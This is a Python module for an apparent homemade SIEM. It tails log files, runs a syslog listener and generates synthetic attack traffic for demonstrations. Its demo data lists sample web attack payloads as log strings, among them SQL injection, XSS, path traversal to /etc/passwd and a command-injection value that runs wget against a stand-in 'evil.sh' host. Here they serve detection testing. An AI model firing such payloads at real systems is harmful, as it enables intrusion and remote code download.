"""Log ingestion: file tailing (with rotation handling), syslog server, demo generator."""
import logging
import os
import random
import socket
import socketserver
import threading
import time

log = logging.getLogger("siem.ingest")


class FileTailer(threading.Thread):
    """Tails a log file like `tail -F` (survives rotation/truncation)."""

    def __init__(self, path, pipeline, source=None, from_start=False):
        super().__init__(daemon=True)
        self.path = path
        self.source = source or os.path.basename(path)
        self.pipeline = pipeline
        self.from_start = from_start

    def run(self):
        f, inode = None, None
        while True:
            try:
                st = os.stat(self.path)
                if f is None or st.st_ino != inode or st.st_size < f.tell():
                    if f:
                        f.close()
                    f = open(self.path, "r", errors="replace")
                    inode = st.st_ino
                    if not self.from_start:
                        f.seek(0, os.SEEK_END)
                    self.from_start = False   # only first open honors it
                    log.info("tailing %s", self.path)
                line = f.readline()
                if line:
                    self.pipeline(line, self.source)
                else:
                    time.sleep(0.4)
            except FileNotFoundError:
                time.sleep(2)
            except Exception as e:
                log.error("tailer %s: %s", self.path, e)
                time.sleep(2)


class _UDPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request[0].decode(errors="replace")
        self.server.pipeline(data, f"syslog:{self.client_address[0]}")


class _TCPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        for line in self.rfile:
            self.server.pipeline(line.decode(errors="replace"),
                                 f"syslog:{self.client_address[0]}")


class SyslogServer:
    """Listens for RFC3164-style syslog over UDP and TCP."""

    def __init__(self, pipeline, host="0.0.0.0", port=5514):
        self.servers = []
        for cls, handler in ((socketserver.ThreadingUDPServer, _UDPHandler),
                             (socketserver.ThreadingTCPServer, _TCPHandler)):
            try:
                cls.allow_reuse_address = True
                srv = cls((host, port), handler)
                srv.pipeline = pipeline
                self.servers.append(srv)
                threading.Thread(target=srv.serve_forever, daemon=True).start()
            except OSError as e:
                log.error("syslog %s bind failed: %s", cls.__name__, e)
        if self.servers:
            log.info("syslog listening on %s:%d (udp+tcp)", host, port)


# ==================================================================== demo
USERS = ["alice", "bob", "deploy", "www-data", "backup", "jenkins"]
BAD_USERS = ["root", "admin", "oracle", "test", "ubuntu", "pi", "guest"]
PATHS = ["/", "/index.html", "/api/v1/users", "/login", "/static/app.js",
         "/images/logo.png", "/api/v1/orders", "/health"]
ATTACK_PATHS = ["/product?id=1' OR 1=1--", "/search?q=<script>alert(1)</script>",
                "/../../etc/passwd", "/.env", "/wp-login.php",
                "/api?cmd=;wget http://evil.sh", "/admin/config"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (X11; Linux x86_64)",
       "curl/8.0.1", "python-requests/2.31"]


def _ts():
    return time.strftime("%b %e %H:%M:%S")


def _http_ts():
    return time.strftime("%d/%b/%Y:%H:%M:%S +0000")


class DemoGenerator(threading.Thread):
    """Emits realistic baseline traffic plus cycling attack scenarios so every
    detection rule can be demonstrated without real infrastructure."""

    def __init__(self, pipeline, intensity=1.0):
        super().__init__(daemon=True)
        self.pipeline = pipeline
        self.intensity = intensity
        # occasionally attack from a "known bad" IP so threat-intel alerts fire
        intel_ips = ["198.51.100.66", "198.51.100.99", "203.0.113.254"]
        self.attacker = lambda: (random.choice(intel_ips) if random.random() < 0.12
                                 else f"203.0.113.{random.randint(2, 250)}")
        self.internal = lambda: f"10.0.0.{random.randint(2, 50)}"

    def emit(self, line):
        self.pipeline(line, "demo")

    def run(self):
        scenarios = [self._bruteforce, self._webattack, self._portscan,
                     self._sudo_abuse, self._compromise, self._recon_burst,
                     self._spray, self._distributed]
        i = 0
        next_attack = time.time() + 15
        while True:
            self._baseline()
            if time.time() >= next_attack:
                scenarios[i % len(scenarios)]()
                i += 1
                next_attack = time.time() + random.uniform(25, 45)
            time.sleep(random.uniform(0.3, 1.2) / self.intensity)

    # ---------------------------------------------------------- baseline
    def _baseline(self):
        r = random.random()
        h = "web-01"
        if r < 0.45:
            ip, path = self.internal(), random.choice(PATHS)
            status = random.choices([200, 301, 404], [0.9, 0.05, 0.05])[0]
            self.emit(f'{ip} - - [{_http_ts()}] "GET {path} HTTP/1.1" {status} '
                      f'{random.randint(200, 9000)} "-" "{random.choice(UAS)}"')
        elif r < 0.6:
            u = random.choice(USERS)
            self.emit(f"{_ts()} {h} sshd[{random.randint(1000,9999)}]: Accepted publickey "
                      f"for {u} from {self.internal()} port {random.randint(40000,60000)} ssh2")
        elif r < 0.75:
            u = random.choice(USERS)
            cmd = random.choice(["/usr/bin/systemctl restart app", "/usr/bin/apt update",
                                 "/bin/journalctl -u nginx"])
            self.emit(f"{_ts()} {h} sudo[{random.randint(1000,9999)}]: {u} : TTY=pts/0 ; "
                      f"PWD=/home/{u} ; USER=root ; COMMAND={cmd}")
        elif r < 0.85:
            self.emit(f"{_ts()} {h} CRON[{random.randint(1000,9999)}]: (root) CMD "
                      f"(/usr/local/bin/backup.sh)")
        else:
            self.emit(f"{_ts()} {h} kernel: [UFW BLOCK] IN=eth0 SRC={self.attacker()} "
                      f"DST=10.0.0.5 PROTO=TCP DPT={random.choice([23, 445, 3389])}")

    # ---------------------------------------------------------- scenarios
    def _spray(self):
        """Password spraying: one IP, many accounts."""
        ip = self.attacker()
        for u in random.sample(USERS + BAD_USERS, 8):
            self.emit(f"{_ts()} web-01 sshd[{random.randint(1000,9999)}]: Failed password "
                      f"for {u} from {ip} port {random.randint(30000,60000)} ssh2")
            time.sleep(0.15)

    def _distributed(self):
        """Distributed brute force: many IPs, one account."""
        for _ in range(6):
            self.emit(f"{_ts()} web-01 sshd[{random.randint(1000,9999)}]: Failed password "
                      f"for deploy from 203.0.113.{random.randint(2, 250)} "
                      f"port {random.randint(30000,60000)} ssh2")
            time.sleep(0.15)

    def _bruteforce(self):
        ip = self.attacker()
        for _ in range(random.randint(6, 12)):
            u = random.choice(BAD_USERS)
            self.emit(f"{_ts()} web-01 sshd[{random.randint(1000,9999)}]: Failed password "
                      f"for invalid user {u} from {ip} port {random.randint(30000,60000)} ssh2")
            time.sleep(0.15)

    def _compromise(self):
        ip = self.attacker()
        for _ in range(4):
            self.emit(f"{_ts()} web-01 sshd[{random.randint(1000,9999)}]: Failed password "
                      f"for deploy from {ip} port {random.randint(30000,60000)} ssh2")
            time.sleep(0.2)
        self.emit(f"{_ts()} web-01 sshd[{random.randint(1000,9999)}]: Accepted password "
                  f"for deploy from {ip} port {random.randint(30000,60000)} ssh2")

    def _webattack(self):
        ip = self.attacker()
        ua = random.choice(["sqlmap/1.7", "Nikto/2.5.0", random.choice(UAS)])
        for _ in range(random.randint(3, 6)):
            path = random.choice(ATTACK_PATHS)
            self.emit(f'{ip} - - [{_http_ts()}] "GET {path} HTTP/1.1" '
                      f'{random.choice([200, 403, 404, 500])} 512 "-" "{ua}"')
            time.sleep(0.2)

    def _portscan(self):
        ip = self.attacker()
        for port in random.sample(range(20, 10000), random.randint(12, 20)):
            self.emit(f"{_ts()} fw-01 kernel: [UFW BLOCK] IN=eth0 SRC={ip} "
                      f"DST=10.0.0.5 PROTO=TCP DPT={port}")
            time.sleep(0.08)

    def _sudo_abuse(self):
        u = random.choice(USERS)
        for _ in range(4):
            self.emit(f"{_ts()} web-01 sudo[{random.randint(1000,9999)}]: pam_unix(sudo:auth): "
                      f"authentication failure; logname={u} uid=1001 euid=0 user={u}")
            time.sleep(0.3)

    def _recon_burst(self):
        ip = self.attacker()
        for _ in range(25):
            path = f"/{random.choice(['admin','backup','old','test','tmp'])}{random.randint(1,99)}"
            self.emit(f'{ip} - - [{_http_ts()}] "GET {path} HTTP/1.1" 404 162 "-" '
                      f'"Mozilla/5.0 (dirbuster)"')
            time.sleep(0.05)
